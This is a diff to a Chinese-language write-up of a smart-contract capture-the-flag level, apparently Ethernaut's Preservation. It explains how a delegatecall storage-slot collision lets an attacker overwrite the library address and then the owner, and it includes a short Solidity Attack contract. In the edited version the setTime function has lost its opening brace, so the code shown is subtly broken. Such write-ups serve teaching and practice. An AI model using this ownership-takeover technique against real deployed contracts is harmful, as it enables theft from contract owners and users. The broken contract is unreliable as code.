@@ -51,20 +51,19 @@ contract LibraryContract {
 
 ## 攻击思路
 
-当前合约使用delegatecall时只会使用代理调用合约的代码逻辑，不能修改代理调用合约的变量。代理调用合约寻找变量时会按照代理调用合约变量所在的插槽寻找当前合约插槽中的变量。
+Preservation 合约使用 delegatecall 时只会使用 LibraryContract合约的代码逻辑，不会也不能修改 LibraryContract合约的变量。LibraryContract合约寻找变量时会按照 LibraryContract合约变量所在的插槽寻找 Preservation合约对应插槽中的变量。
 
 ## 攻击流程
 
-首先调用Preservation合约的setFirstTime函数，函数参数为Attack合约的地址。然后再调用Preservation合约的setFirstTime函数，函数参数为：我的账户地址。
+首先调用 Preservation合约 的 setFirstTime函数，函数参数为： Attack合约的地址。此时，Preservation合约中的timeZone1Library变量就修改为了Attack合约的地址。然后再调用 Preservation合约的 setFirstTime函数，函数参数为：我的账户地址。
 
 ```solidity
 contract Attack {
-    // public library contracts 
     address public timeZone1Library;
     address public timeZone2Library;
     address public owner; 
 
-    function setTime(uint _time) public{
+    function setTime(uint _time) public 
        owner = address(_time);
     }
 }
